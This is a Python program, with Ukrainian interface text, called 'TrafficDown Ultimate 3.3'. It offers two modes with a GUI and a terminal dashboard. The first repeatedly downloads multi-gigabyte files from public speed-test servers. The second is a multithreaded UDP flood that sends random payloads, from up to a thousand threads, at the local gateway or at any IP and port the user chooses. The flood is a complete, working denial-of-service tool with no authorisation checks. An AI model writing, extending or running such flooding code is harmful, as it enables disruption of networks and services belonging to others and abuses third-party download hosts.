# -*- coding: utf-8 -*-
"""
TrafficDown Ultimate 3.3
--------------------------
Багатопотоковий інструмент для генерації мережевого навантаження (HTTP Download та UDP Flood)
з підтримкою графічного (Windows) та консольного (всі системи) інтерфейсів.

Версія 3.3:
- Додано вкладку "Logs" в GUI для перегляду логів у реальному часі.
- Винесено список URL для завантаження в конфігураційний файл.
- Виправлено критичну помилку AttributeError з '_from_'.
- Покращено потокобезпеку при логуванні в GUI.
"""

import os
import sys
import time
import json
import asyncio
import threading
import socket
import random
import platform
import subprocess
from datetime import datetime
import logging
from logging.handlers import RotatingFileHandler
from typing import Dict, Any, Tuple, Optional, List

# --- 0. ГЛОБАЛЬНА КОНФІГУРАЦІЯ ТА ІНІЦІАЛІЗАЦІЯ ---

# Визначення системних констант
IS_WINDOWS = os.name == 'nt'
IS_ANDROID = "com.termux" in os.environ.get("PREFIX", "")

# Налаштування файлів
CONFIG_FILE = "TrafficDown_config.json"
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, "TrafficDown.log")

# Налаштування логера
log = logging.getLogger("TrafficDown")
if not log.handlers:
    log.setLevel(logging.DEBUG)
    formatter = logging.Formatter("%(asctime)s | %(levelname)-8s | %(threadName)-15s | %(message)s")
    
    file_handler = RotatingFileHandler(LOG_FILE, maxBytes=5_000_000, backupCount=3, encoding="utf-8")
    file_handler.setFormatter(formatter)
    file_handler.setLevel(logging.DEBUG)
    
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    console_handler.setLevel(logging.INFO)
    
    log.addHandler(file_handler)
    log.addHandler(console_handler)

def auto_install_packages() -> None:
    """Перевіряє наявність необхідних пакетів і встановлює відсутні."""
    required = ["aiohttp", "rich", "psutil", "requests"]
    if IS_WINDOWS:
        required.append("customtkinter")
    
    try:
        import importlib
        missing = []
        for lib in required:
            try:
                importlib.import_module(lib)
            except ImportError:
                missing.append(lib)
                
        if missing:
            log.warning(f"Відсутні необхідні модулі: {', '.join(missing)}. Спроба автоматичного встановлення...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])
            log.info("Усі модулі успішно встановлено! Перезапуск скрипту для застосування змін...")
            time.sleep(1)
            os.execl(sys.executable, sys.executable, *sys.argv)
    except Exception as e:
        log.critical(f"Критична помилка під час встановлення або перевірки модулів: {e}")
        log.critical("Будь ласка, встановіть модулі вручну: pip install aiohttp rich psutil requests customtkinter")
        sys.exit(1)

auto_install_packages()

import aiohttp
import psutil
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.align import Align
from rich.prompt import Prompt, IntPrompt
from rich import box

GUI_AVAILABLE = False
if IS_WINDOWS:
    try:
        import customtkinter as ctk
        GUI_AVAILABLE = True
    except ImportError:
        log.warning("Модуль customtkinter не знайдено. Графічний інтерфейс буде недоступний.")

# --- 1. МЕНЕДЖЕР КОНФІГУРАЦІЇ ---
class Config:
    """Керує конфігурацією програми (завантаження, збереження, скидання)."""
    def __init__(self) -> None:
        self.default: Dict[str, Any] = {
            "target_ip": "192.168.0.1",
            "target_port": 80,
            "threads_dl": 20,
            "threads_ul": 100,
            "packet_size": 4096,
            "download_urls": [
                'https://speed.hetzner.de/10GB.bin',
                'https://speed.hetzner.de/1GB.bin',
                'https://speedtest.selectel.ru/10GB',
                'https://proof.ovh.net/files/10Gb.dat',
                'http://speedtest.tele2.net/10GB.zip',
                'http://speedtest-ny.turnkeyinternet.net/10000mb.bin',
                'http://ipv4.download.thinkbroadband.com/1GB.zip'
            ]
        }
        self.data = self.load()

    def load(self) -> Dict[str, Any]:
        """Завантажує конфігурацію, доповнюючи її значеннями за замовчуванням."""
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                    config_from_file = json.load(f)
                return {**self.default, **config_from_file}
            except (json.JSONDecodeError, IOError) as e:
                log.error(f"Не вдалося завантажити '{CONFIG_FILE}': {e}. Використовуються значення за замовчуванням.")
        return self.default.copy()

    def save(self) -> None:
        """Зберігає поточну конфігурацію."""
        try:
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump(self.data, f, indent=4)
        except IOError as e:
            log.error(f"Не вдалося зберегти '{CONFIG_FILE}': {e}")
    
    def reset_to_default(self) -> None:
        """Скидає конфігурацію до значень за замовчуванням."""
        self.data = self.default.copy()
        self.save()
        log.info("Конфігурацію скинуто до значень за замовчуванням.")

    def get_gateway_ip(self) -> str:
        """Намагається визначити IP-адресу шлюзу."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
            return ".".join(local_ip.split('.')[:3]) + ".1"
        except socket.error:
            return self.default["target_ip"]

cfg = Config()

# --- 2. МЕРЕЖЕВИЙ РУШІЙ ---
class NetworkEngine:
    """Керує мережевими операціями (HTTP Download та UDP Flood)."""
    def __init__(self) -> None:
        self.running = False
        self.mode = "IDLE"
        self.lock = threading.Lock()
        self.dl_total = self.ul_total = self.errors = 0
        self.last_error = "—"
        self.urls: List[str] = cfg.data.get("download_urls", [])
        if not self.urls:
            log.warning("Список URL для завантаження порожній. Режим завантаження не працюватиме.")
        
        self.loop = asyncio.new_event_loop()
        threading.Thread(target=self._async_loop_manager, name="AsyncLoopThread", daemon=True).start()

    def _async_loop_manager(self) -> None:
        asyncio.set_event_loop(self.loop)
        try:
            self.loop.run_forever()
        finally:
            self.loop.close()

    def start_download(self) -> None:
        if self.running: return
        if not self.urls:
            log.error("Неможливо запустити завантаження: список URL-адрес порожній.")
            return
        log.info(f"ENGINE: Запуск режиму завантаження. Потоків: {cfg.data['threads_dl']}")
        self.running, self.mode = True, "DOWNLOADING"
        for _ in range(cfg.data['threads_dl']):
            asyncio.run_coroutine_threadsafe(self._dl_task(), self.loop)

    def start_flood(self, ip: str, port: int) -> None:
        if self.running: return
        log.warning(f"ENGINE: Запуск UDP-флуду -> {ip}:{port}. Потоків: {cfg.data['threads_ul']}")
        self.running, self.mode = True, "UDP FLOOD"
        cfg.data.update({'target_ip': ip, 'target_port': port})
        cfg.save()
        for _ in range(cfg.data['threads_ul']):
            asyncio.run_coroutine_threadsafe(self._ul_task(ip, port), self.loop)

    def stop(self) -> None:
        if self.running:
            log.info("ENGINE: Зупинка всіх мережевих операцій.")
            self.running, self.mode = False, "IDLE"
            time.sleep(0.2)
            with self.lock:
                self.dl_total = self.ul_total = self.errors = 0
                self.last_error = "—"

    async def _dl_task(self) -> None:
        """Асинхронне завдання для завантаження даних."""
        conn = aiohttp.TCPConnector(ssl=False, limit=0)
        async with aiohttp.ClientSession(connector=conn) as session:
            while self.running and self.mode == "DOWNLOADING":
                try:
                    url = random.choice(self.urls)
                    async with session.get(url, timeout=10) as resp:
                        resp.raise_for_status()
                        while self.running and self.mode == "DOWNLOADING":
                            chunk = await resp.content.read(1024 * 1024)
                            if not chunk: break
                            with self.lock: self.dl_total += len(chunk)
                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                    with self.lock:
                        self.errors += 1
                        self.last_error = f"{type(e).__name__}: {str(e)[:60]}"
                    await asyncio.sleep(2)

    async def _ul_task(self, ip: str, port: int) -> None:
        """Асинхронне завдання для UDP-флуду."""
        try:
            payload = os.urandom(cfg.data['packet_size'])
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            while self.running and self.mode == "UDP FLOOD":
                try:
                    sock.sendto(payload, addr)
                    with self.lock: self.ul_total += len(payload)
                    if IS_ANDROID: await asyncio.sleep(0.001)
                except socket.error as e:
                    with self.lock:
                        self.errors += 1
                        self.last_error = f"{type(e).__name__}: {str(e)[:60]}"
                    await asyncio.sleep(1)
            sock.close()
        except socket.gaierror as e:
            with self.lock:
                self.errors += 1
                self.last_error = f"Address Resolution Error: {e}"
        except Exception as e:
            log.error(f"Неочікувана помилка в UDP-завданні: {e}")

    def get_stats(self) -> Dict[str, Any]:
        """Повертає поточну статистику в потокобезпечний спосіб."""
        with self.lock:
            return {"dl": self.dl_total, "ul": self.ul_total, "err": self.errors,
                    "mode": self.mode, "active": self.running, "last_error": self.last_error}

engine = NetworkEngine()

# --- 3. КОНСОЛЬНИЙ ІНТЕРФЕЙС (TUI) ---
class TermuxUI:
    """Відображення інтерфейсу в терміналі з використанням Rich."""
    def __init__(self) -> None:
        self.console = Console()
        self.last_dl = self.last_ul = 0
        self.last_t = time.time()

    def generate_dashboard(self) -> Table:
        """Створює головну таблицю зі статистикою."""
        stats = engine.get_stats()
        now = time.time()
        delta = max(now - self.last_t, 1e-6)
        spd_dl = (stats['dl'] - self.last_dl) / delta / 1024**2
        spd_ul = (stats['ul'] - self.last_ul) / delta / 1024**2
        self.last_dl, self.last_ul, self.last_t = stats['dl'], stats['ul'], now

        main_layout = Table.grid(expand=True, padding=1)
        main_layout.add_column()
        header = Panel(Align.center(
            f"[bold green]TRAFFICDOWN 3.3[/]\n[dim]Ціль: {cfg.data['target_ip']}:{cfg.data['target_port']} | Потоки: DL {cfg.data['threads_dl']} / UL {cfg.data['threads_ul']}[/]"
        ), border_style="green", title="[bold]Статус[/]")
        main_layout.add_row(header)

        stats_table = Table(box=box.MINIMAL_HEAVY_HEAD, show_header=False)
        stats_table.add_column(style="cyan", justify="right")
        stats_table.add_column(style="bold white", justify="left")
        status_color = 'green' if stats['active'] else 'red'
        stats_table.add_row("Статус:", f"[{status_color}]{stats['mode']}[/]")
        stats_table.add_row("Швидкість DL:", f"[bold green]{spd_dl:.2f} MB/s[/]")
        stats_table.add_row("Швидкість UL:", f"[bold red]{spd_ul:.2f} MB/s[/]")
        stats_table.add_row("Всього DL:", f"[green]{stats['dl'] / 1024**3:.3f} GB[/]")
        stats_table.add_row("Всього UL:", f"[red]{stats['ul'] / 1024**3:.3f} GB[/]")
        stats_table.add_row("Помилки:", f"[yellow]{stats['err']}[/]")

        try:
            cpu, ram = psutil.cpu_percent(), psutil.virtual_memory().percent
            res_text = f"CPU: [bold {'green' if cpu < 70 else 'red'}]{cpu}%[/] | RAM: [bold {'green' if ram < 80 else 'red'}]{ram}%[/]"
        except Exception: res_text = "N/A"
        
        main_layout.add_row(Panel(stats_table, title="[bold cyan]Live Статистика[/]"))
        main_layout.add_row(Panel(Align.center(res_text), title="[bold blue]Система[/]"))
        main_layout.add_row(Panel(f"[dim]{stats['last_error']}[/]", title="[bold yellow]Остання помилка[/]"))
        main_layout.add_row(Align.center("[yellow]Натисніть [b]Ctrl+C[/b] щоб зупинити та повернутись в меню.[/]"))
        return main_layout

    def run(self) -> None:
        """Головний цикл консольного інтерфейсу."""
        while True:
            self.console.clear()
            gateway_ip = cfg.get_gateway_ip()
            menu = Panel(
                f"[bold cyan]1.[/] Завантаження (тест швидкості)\n"
                f"[bold cyan]2.[/] UDP Flood на шлюз ([dim]{gateway_ip}[/])\n"
                f"[bold cyan]3.[/] UDP Flood на власну ціль\n\n"
                f"[bold red]q.[/] Вихід",
                title="[bold green]TRAFFICDOWN 3.3 - Меню[/]", border_style="green", expand=False)
            self.console.print(menu)
            choice = Prompt.ask("[yellow]Ваш вибір[/yellow]").strip().lower()
            
            action = None
            if choice == '1': action = engine.start_download
            elif choice == '2': action = lambda: engine.start_flood(gateway_ip, 80)
            elif choice == '3':
                try:
                    ip = Prompt.ask("[cyan]Введіть IP[/cyan]", default=cfg.data['target_ip'])
                    port = IntPrompt.ask("[cyan]Введіть порт[/cyan]", default=cfg.data['target_port'])
                    if not (0 < port < 65536): raise ValueError("Некоректний порт.")
                    action = lambda: engine.start_flood(ip, port)
                except (ValueError, Exception) as e:
                    self.console.print(f"\n[bold red]Помилка: {e}[/]"); time.sleep(2)
            elif choice in ('q', 'й'): return

            if action:
                try:
                    action()
                    with Live(self.generate_dashboard(), console=self.console, screen=True, refresh_per_second=4) as live:
                        while engine.running: live.update(self.generate_dashboard())
                except KeyboardInterrupt: self.console.print("\n[bold yellow]Зупинка...[/]")
                finally:
                    engine.stop()
                    self.console.print("[bold green]Процес зупинено.[/]"); time.sleep(1.5)

# --- 4. ГРАФІЧНИЙ ІНТЕРФЕЙС (GUI) ---
if GUI_AVAILABLE:
    class GUILogHandler(logging.Handler):
        """Обробник логів, що направляє записи в текстове поле CTk."""
        def __init__(self, textbox: ctk.CTkTextbox):
            super().__init__()
            self.textbox = textbox

        def emit(self, record: logging.LogRecord) -> None:
            msg = self.format(record)
            # Оновлення GUI має відбуватися в головному потоці
            self.textbox.after(0, self.thread_safe_insert, msg)

        def thread_safe_insert(self, msg: str) -> None:
            self.textbox.configure(state="normal")  # Увімкнути для запису
            self.textbox.insert("end", msg + "\n")
            self.textbox.see("end")
            self.textbox.configure(state="disabled") # Вимкнути назад в режим "тільки для читання"


    class WindowsGUI:
        """Оновлений GUI на Windows з використанням CustomTkinter."""
        THEME = {
            "bg_color": ("gray92", "#1D1F21"), "fg_color": ("#FFFFFF", "#2C2F33"),
            "text_color": ("#000000", "#F0F0F0"), "accent_color": "#4A90E2",
            "dl_color": "#2ECC71", "ul_color": "#E74C3C",
            "warn_color": "#F39C12", "stop_color": "#C0392B",
            "canvas_bg": ("#FAFAFA", "#282C34"),
            "font_large": ("Arial", 32, "bold"), "font_medium": ("Arial", 16, "bold"),
            "font_normal": ("Arial", 14), "font_small": ("Consolas", 11),
        }

        def __init__(self) -> None:
            self.root = ctk.CTk()
            self.root.title("TrafficDown Ultimate 3.3")
            self.root.geometry("1000x720")
            self.root.minsize(900, 650)
            ctk.set_appearance_mode("System")

            self.last_dl = self.last_ul = 0.0
            self.last_t = time.time()
            self.dl_history = [0.0] * 50
            self.ul_history = [0.0] * 50
            self.slider_widgets: Dict[str, Tuple[ctk.CTkSlider, ctk.CTkLabel]] = {}
            self.status_message_job: Optional[str] = None

            self.setup_ui()
            self.setup_logging()
            self.update_loop()

        def setup_ui(self) -> None:
            self.root.grid_columnconfigure(0, weight=1)
            self.root.grid_rowconfigure(0, weight=1)
            self.root.configure(fg_color=self.THEME["bg_color"])

            tab_view = ctk.CTkTabview(self.root, fg_color=self.THEME["fg_color"])
            tab_view.grid(row=0, column=0, padx=15, pady=15, sticky="nsew")
            tab_view.configure(segmented_button_selected_color=self.THEME["accent_color"])
            
            self.dashboard_tab = tab_view.add("Dashboard")
            self.settings_tab = tab_view.add("Settings")
            self.log_tab = tab_view.add("Logs")

            self._setup_dashboard(self.dashboard_tab)
            self._setup_settings(self.settings_tab)
            self._setup_logs_tab(self.log_tab)
        
        def _create_stat_frame(self, parent, title, color):
            frame = ctk.CTkFrame(parent, fg_color="transparent")
            frame.grid_columnconfigure(0, weight=1)
            ctk.CTkLabel(frame, text=title, font=("Arial", 18, "bold"), text_color=color).grid(row=0, pady=(5,0))
            lbl_speed = ctk.CTkLabel(frame, text="0.0 MB/s", font=self.THEME["font_large"], text_color=color)
            lbl_speed.grid(row=1, pady=(5,5))
            lbl_total = ctk.CTkLabel(frame, text="Total: 0.00 GB", font=("Arial", 12))
            lbl_total.grid(row=2, pady=(0,10))
            return lbl_speed, lbl_total

        def _setup_dashboard(self, tab: ctk.CTkFrame) -> None:
            tab.grid_columnconfigure(0, weight=1); tab.grid_rowconfigure(1, weight=1)
            top_panel = ctk.CTkFrame(tab); top_panel.grid(row=0, column=0, sticky="ew", pady=(0, 10))
            top_panel.grid_columnconfigure((0, 2), weight=1); top_panel.grid_columnconfigure(1, weight=1)

            self.lbl_dl_speed, self.lbl_dl_total = self._create_stat_frame(top_panel, "DOWNLOAD", self.THEME["dl_color"])
            self.lbl_dl_speed.master.master.grid(row=0, column=0, sticky="nsew", padx=10, pady=5)
            self.lbl_ul_speed, self.lbl_ul_total = self._create_stat_frame(top_panel, "UPLOAD", self.THEME["ul_color"])
            self.lbl_ul_speed.master.master.grid(row=0, column=2, sticky="nsew", padx=10, pady=5)

            center_frame = ctk.CTkFrame(top_panel); center_frame.grid(row=0, column=1, sticky="nsew", padx=10, pady=5)
            center_frame.grid_columnconfigure(0, weight=1)
            self.lbl_mode = ctk.CTkLabel(center_frame, text="MODE: IDLE", font=self.THEME["font_medium"]); self.lbl_mode.pack(pady=(15, 5), expand=True)
            self.lbl_total_traffic = ctk.CTkLabel(center_frame, text="TOTAL: 0.00 GB", font=self.THEME["font_normal"]); self.lbl_total_traffic.pack(pady=5, expand=True)
            self.lbl_errors_count = ctk.CTkLabel(center_frame, text="ERRORS: 0", font=self.THEME["font_normal"]); self.lbl_errors_count.pack(pady=(5, 15), expand=True)

            graph_panel = ctk.CTkFrame(tab); graph_panel.grid(row=1, column=0, sticky="nsew", pady=10)
            graph_panel.grid_columnconfigure(0, weight=1); graph_panel.grid_rowconfigure(0, weight=1)
            self.canvas = ctk.CTkCanvas(graph_panel, highlightthickness=0); self.canvas.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
            self.canvas.bind("<Configure>", self.draw_graph)
            
            control_panel = ctk.CTkFrame(tab); control_panel.grid(row=2, column=0, sticky="ew", pady=(10, 0))
            control_panel.grid_columnconfigure((0, 1), weight=1)
            self.btn_dl = ctk.CTkButton(control_panel, command=self.toggle_dl, height=50, font=("Arial", 16, "bold")); self.btn_dl.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
            self.btn_ul = ctk.CTkButton(control_panel, command=self.toggle_ul, height=50, font=("Arial", 16, "bold")); self.btn_ul.grid(row=0, column=1, padx=10, pady=10, sticky="ew")
            
            status_bar = ctk.CTkFrame(tab, fg_color="transparent"); status_bar.grid(row=3, column=0, sticky="ew", pady=(5,0), padx=10)
            ctk.CTkLabel(status_bar, text="Status:", font=self.THEME["font_small"]).pack(side="left")
            self.lbl_status = ctk.CTkLabel(status_bar, text="—", anchor="w", font=self.THEME["font_small"], text_color="gray"); self.lbl_status.pack(side="left", fill="x", expand=True, padx=5)

        def _setup_settings(self, tab: ctk.CTkFrame) -> None:
            tab.grid_columnconfigure(0, weight=1); tab.grid_rowconfigure(0, weight=1)
            scroll_frame = ctk.CTkScrollableFrame(tab, label_text="Application Settings"); scroll_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
            scroll_frame.grid_columnconfigure(0, weight=1)
            
            def create_group(p, title, r):
                g = ctk.CTkFrame(p); g.grid(row=r, column=0, sticky="ew", padx=10, pady=10); g.grid_columnconfigure(1, weight=1)
                ctk.CTkLabel(g, text=title, font=self.THEME["font_medium"]).grid(row=0, column=0, columnspan=2, pady=10, padx=20, sticky="w")
                return g

            target_g = create_group(scroll_frame, "Target Configuration", 0)
            ctk.CTkLabel(target_g, text="Target IP:").grid(row=1, column=0, padx=20, pady=10, sticky="w")
            self.ent_ip = ctk.CTkEntry(target_g); self.ent_ip.grid(row=1, column=1, padx=20, pady=10, sticky="ew")
            ctk.CTkLabel(target_g, text="Target Port:").grid(row=2, column=0, padx=20, pady=10, sticky="w")
            self.ent_port = ctk.CTkEntry(target_g); self.ent_port.grid(row=2, column=1, padx=20, pady=10, sticky="ew")

            perf_g = create_group(scroll_frame, "Performance Tuning", 1)
            self._add_slider(perf_g, "Download Threads", 1, 100, 'threads_dl', 1)
            self._add_slider(perf_g, "Flood Threads", 10, 1000, 'threads_ul', 3)
            self._add_slider(perf_g, "Packet Size (bytes)", 64, 8192, 'packet_size', 5)

            ui_g = create_group(scroll_frame, "Appearance", 2)
            ctk.CTkLabel(ui_g, text="Theme:").grid(row=1, column=0, padx=20, pady=10, sticky="w")
            self.theme_menu = ctk.CTkOptionMenu(ui_g, values=["System", "Dark", "Light"], command=ctk.set_appearance_mode); self.theme_menu.grid(row=1, column=1, padx=20, pady=10, sticky="ew")

            btn_frame = ctk.CTkFrame(tab, fg_color="transparent"); btn_frame.grid(row=1, column=0, sticky="ew", padx=10, pady=(0, 10))
            btn_frame.grid_columnconfigure((0,1), weight=1)
            ctk.CTkButton(btn_frame, text="Save Settings", command=self.save_settings, height=40).grid(row=0, column=0, padx=10, sticky="ew")
            ctk.CTkButton(btn_frame, text="Reset to Default", command=self.reset_settings, height=40, fg_color="gray50", hover_color="gray40").grid(row=0, column=1, padx=10, sticky="ew")
            self._update_settings_ui()

        def _setup_logs_tab(self, tab: ctk.CTkFrame) -> None:
            tab.grid_columnconfigure(0, weight=1); tab.grid_rowconfigure(0, weight=1)
            self.log_textbox = ctk.CTkTextbox(tab, font=self.THEME["font_small"], activate_scrollbars=True)
            self.log_textbox.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
            self.log_textbox.configure(state="disabled") # Read-only

        def setup_logging(self) -> None:
            gui_handler = GUILogHandler(self.log_textbox)
            gui_handler.setFormatter(logging.Formatter("%(asctime)s | %(levelname)-8s | %(message)s"))
            gui_handler.setLevel(logging.INFO)
            log.addHandler(gui_handler)

        def _add_slider(self, p, text, f, t, key, r) -> None:
            ctk.CTkLabel(p, text=f"{text}:").grid(row=r, column=0, sticky="w", padx=20, pady=(10,0))
            lbl = ctk.CTkLabel(p, text=str(cfg.data.get(key,f))); lbl.grid(row=r, column=1, sticky="e", padx=20, pady=(10,0))
            steps = (t - f) if (t-f) < 1000 else 1000
            slider = ctk.CTkSlider(p, from_=f, to=t, number_of_steps=steps, command=lambda v, k=key: self.slider_widgets[k][1].configure(text=f"{int(v)}"))
            slider.grid(row=r + 1, column=0, columnspan=2, sticky="ew", padx=20, pady=(0, 15))
            self.slider_widgets[key] = (slider, lbl)

        def _update_settings_ui(self) -> None:
            self.ent_ip.delete(0, 'end'); self.ent_ip.insert(0, cfg.data['target_ip'])
            self.ent_port.delete(0, 'end'); self.ent_port.insert(0, str(cfg.data['target_port']))
            for key, (slider, label) in self.slider_widgets.items():
                val = cfg.data.get(key, slider._from_) # ВИПРАВЛЕНО
                slider.set(val)
                label.configure(text=str(int(val)))

        def set_status_message(self, text, color="gray", duration_s=4) -> None:
            self.lbl_status.configure(text=text, text_color=color)
            if self.status_message_job: self.root.after_cancel(self.status_message_job)
            self.status_message_job = self.root.after(duration_s * 1000, lambda: self.lbl_status.configure(text=engine.get_stats()['last_error'], text_color="gray"))

        def toggle_dl(self):
            if engine.running and engine.mode == "DOWNLOADING": engine.stop()
            elif not engine.running: engine.start_download()

        def toggle_ul(self):
            if engine.running and "UDP" in engine.mode: engine.stop()
            elif not engine.running:
                if self.save_settings(): engine.start_flood(cfg.data['target_ip'], cfg.data['target_port'])
        
        def update_buttons(self) -> None:
            dl_run = engine.running and engine.mode == "DOWNLOADING"
            ul_run = engine.running and "UDP" in engine.mode
            self.btn_dl.configure(text="⏹ STOP" if dl_run else "▶ START DOWNLOAD", fg_color=self.THEME["stop_color"] if dl_run else self.THEME["dl_color"], state="disabled" if ul_run else "normal")
            self.btn_ul.configure(text="⏹ STOP" if ul_run else "▶ START FLOOD", fg_color=self.THEME["stop_color"] if ul_run else self.THEME["ul_color"], state="disabled" if dl_run else "normal")

        def save_settings(self) -> bool:
            try:
                ip, port_str = self.ent_ip.get(), self.ent_port.get()
                if not ip: raise ValueError("IP-адреса не може бути порожньою.")
                if not (port_str.isdigit() and 1<=int(port_str)<=65535): raise ValueError("Порт має бути числом від 1 до 65535.")
                cfg.data.update({
                    'target_ip': ip, 'target_port': int(port_str),
                    'threads_dl': int(self.slider_widgets['threads_dl'][0].get()),
                    'threads_ul': int(self.slider_widgets['threads_ul'][0].get()),
                    'packet_size': int(self.slider_widgets['packet_size'][0].get()),
                })
                cfg.save(); log.info("Налаштування успішно збережено.")
                self.set_status_message("Налаштування збережено!", self.THEME["dl_color"])
                return True
            except (ValueError, Exception) as e:
                self.set_status_message(f"Помилка збереження: {e}", self.THEME["warn_color"])
                log.error(f"Не вдалося зберегти налаштування: {e}")
            return False

        def reset_settings(self):
            cfg.reset_to_default(); self._update_settings_ui()
            self.set_status_message("Налаштування скинуто до стандартних.", "gray")

        def draw_graph(self, event: Optional[Any] = None) -> None:
            w, h = self.canvas.winfo_width(), self.canvas.winfo_height()
            self.canvas.delete("all")
            if not (w > 1 and h > 1): return

            is_dark = ctk.get_appearance_mode() == "Dark"
            grid_c, text_c = ("#404040", "#909090") if is_dark else ("#E0E0E0", "#333333")
            self.canvas.configure(bg=self.THEME["canvas_bg"][1] if is_dark else self.THEME["canvas_bg"][0])

            max_val = max(max(self.dl_history), max(self.ul_history), 10)
            max_y = (int(max_val / 10) + 1) * 10
            
            for i in range(1, 5):
                y = h*i/5; self.canvas.create_line(0, y, w, y, fill=grid_c, dash=(2,4))
                self.canvas.create_text(20, y-10, text=f"{max_y*(5-i)/5:.0f}", fill=text_c, anchor="w")
            self.canvas.create_text(20, 10, text="MB/s", fill=text_c, anchor="w")

            self.canvas.create_rectangle(w-130,10,w-115,25,fill=self.THEME["dl_color"], outline="")
            self.canvas.create_text(w-110, 18, text="Download", fill=text_c, anchor="w")
            self.canvas.create_rectangle(w-130,30,w-115,45,fill=self.THEME["ul_color"], outline="")
            self.canvas.create_text(w-110, 38, text="Upload", fill=text_c, anchor="w")

            def plot(hist: list, color: str):
                pts = [(w*i/(len(hist)-1), h-(h*v/max_y if max_y>0 else 0)) for i,v in enumerate(hist) if len(hist)>1]
                if len(pts)>1: self.canvas.create_line(pts, fill=color, width=2.5, smooth=True)
            plot(self.ul_history, self.THEME["ul_color"]); plot(self.dl_history, self.THEME["dl_color"])

        def update_loop(self) -> None:
            stats = engine.get_stats(); now = time.time(); delta = max(now - self.last_t, 1e-6)
            sdl = (stats['dl']-self.last_dl)/delta/1024**2; sul = (stats['ul']-self.last_ul)/delta/1024**2
            self.last_dl, self.last_ul, self.last_t = stats['dl'], stats['ul'], now
            self.dl_history, self.ul_history = self.dl_history[1:]+[max(0,sdl)], self.ul_history[1:]+[max(0,sul)]
            dl_gb, ul_gb = stats['dl']/1024**3, stats['ul']/1024**3
            
            self.lbl_dl_speed.configure(text=f"{sdl:.1f} MB/s"); self.lbl_dl_total.configure(text=f"Total: {dl_gb:.2f} GB")
            self.lbl_ul_speed.configure(text=f"{sul:.1f} MB/s"); self.lbl_ul_total.configure(text=f"Total: {ul_gb:.2f} GB")
            self.lbl_mode.configure(text=f"MODE: {stats['mode']}"); self.lbl_total_traffic.configure(text=f"TOTAL: {dl_gb+ul_gb:.2f} GB")
            self.lbl_errors_count.configure(text=f"ERRORS: {stats['err']}")
            if not self.status_message_job: self.lbl_status.configure(text=stats['last_error'])
            
            if self.root.winfo_viewable() and self.dashboard_tab.winfo_ismapped(): self.draw_graph()
            
            self.update_buttons()
            self.root.after(500, self.update_loop)

        def run(self):
            self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
            self.root.mainloop()

        def on_closing(self):
            log.info("Отримано запит на закриття вікна. Зупинка...")
            engine.stop()
            self.root.destroy()

# --- 5. ГОЛОВНА ТОЧКА ВХОДУ ---
if __name__ == "__main__":
    try:
        if IS_WINDOWS and GUI_AVAILABLE:
            log.info("Запуск графічного інтерфейсу для Windows.")
            app = WindowsGUI()
            app.run()
        else:
            if IS_WINDOWS: log.warning("Не вдалося запустити GUI. Перехід до консольного режиму.")
            log.info("Запуск консольного інтерфейсу.")
            app = TermuxUI()
            app.run()
    except KeyboardInterrupt:
        log.info("Програму зупинено користувачем (Ctrl+C).")
    except Exception as e:
        log.critical(f"Виникла неперехоплена глобальна помилка: {e}", exc_info=True)
    finally:
        log.info("Завершення роботи. Зупиняємо всі активні процеси...")
        engine.stop()
        print("\nTrafficDown завершив роботу. До побачення!")
        os._exit(0)
